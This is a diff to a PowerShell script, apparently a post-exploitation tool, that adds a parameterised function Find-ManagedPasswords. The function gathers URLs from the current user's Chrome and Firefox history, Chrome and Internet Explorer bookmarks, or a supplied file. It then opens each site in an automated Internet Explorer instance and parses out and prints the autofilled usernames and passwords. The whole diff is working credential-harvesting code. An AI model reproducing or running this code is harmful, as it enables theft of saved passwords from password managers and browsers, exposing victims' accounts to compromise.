@@ -1,4 +1,4 @@
-﻿##########################################
+##########################################
 # Start Browser History Section
 ##########################################
 # Lot's taken from:
@@ -67,7 +67,7 @@ Function Get-FireFoxHistory ($UserName) {
 
 Function Browse-Url ($Url) {
     $ie = New-Object -ComObject InternetExplorer.Application.1
-    $ie.Visible = $False
+    $ie.Visible = $True
     $ie.Silent = $True
     $ie.Navigate($Url)
     while ($ie.Busy) {Start-Sleep -Seconds 1}
@@ -154,30 +154,81 @@ Function Detect-PasswordManager {
 # End Password Manager Detection Section
 ##########################################
 
-Detect-PasswordManager
+Function Find-ManagedPasswords {
+    [cmdletbinding()]
+    Param(
 
-$urls = @( )
-$urls += Get-ChromeBookmarks -UserName $env:USERNAME
-$urls += Get-InternetExplorerBookmarks -UserName $env:USERNAME
-$urls = $urls | Sort-Object -Unique
-$totalurls = $urls.Count
-Write-Output "Loaded $totalurls URLs for browsing"
-$counter = 1
+    [Parameter(Mandatory = $false)]
+    $URLFile,
 
-foreach($url in $urls) {
-    Write-Output "Browsing $url -  Site $counter of $totalurls"
-    $Browser = Browse-Url -Url $url
-    Start-Sleep -Seconds 2
-    if ($Browser -eq $null) { continue }
-    $user = Parse-Username -BrowserObject $Browser
-    $pass = Parse-Password -BrowserObject $Browser
-    $Browser.Quit()
-    $counter += 1
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $DisplayStatus,
 
-    if ($user -or $pass) {
-        Write-Output "URL: $url"
-        Write-Output "Username: $user"
-        Write-Output "Password: $pass"
-        Write-Output ""
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $URLsFromChromeHistory,
+
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $URLsFromChromeBookmarks,
+
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $URLsFromFireFoxHistory,
+
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $DetectPasswordManager,
+
+    [Parameter(Mandatory = $false)]
+    [switch]
+    $URLsFromInternetExplorerBookmarks
+
+    )
+
+    $urls = @( )
+    if ($URLFile) {
+        if (-not (Test-Path -Path $URLFile)){
+            Write-Verbose "[-] Unable to access $URLFile. Check the path and try again"
+            return
+        }
+        $urls += Get-Content $URLFile
     }
+    if ($URLsFromChromeHistory) {
+        $urls += Get-ChromeHistory -UserName $env:USERNAME
+    }
+    if ($URLsFromChromeBookmarks) {
+        $urls += Get-ChromeBookmarks -UserName $env:USERNAME
+    }
+    if ($URLsFromFireFoxHistory) {
+        $urls += Get-FireFoxHistory -UserName $env:USERNAME
+    }
+    if ($URLsFromInternetExplorerBookmarks) {
+        $urls += Get-InternetExplorerBookmarks -UserName $env:USERNAME
+    }
+
+    $urls = $urls | Sort-Object -Unique
+    $totalurls = $urls.Count
+    Write-Output "Loaded $totalurls URLs for browsing"
+    $counter = 1
+
+    foreach($url in $urls) {
+        Write-Output "Browsing $url -  Site $counter of $totalurls"
+        $Browser = Browse-Url -Url $url
+        Start-Sleep -Seconds 2
+        if ($Browser -eq $null) { continue }
+        $user = Parse-Username -BrowserObject $Browser
+        $pass = Parse-Password -BrowserObject $Browser
+        $Browser.Quit()
+        $counter += 1
+
+        if ($user -or $pass) {
+            Write-Output "URL: $url"
+            Write-Output "Username: $user"
+            Write-Output "Password: $pass"
+            Write-Output ""
+        }
+    }
+
 }
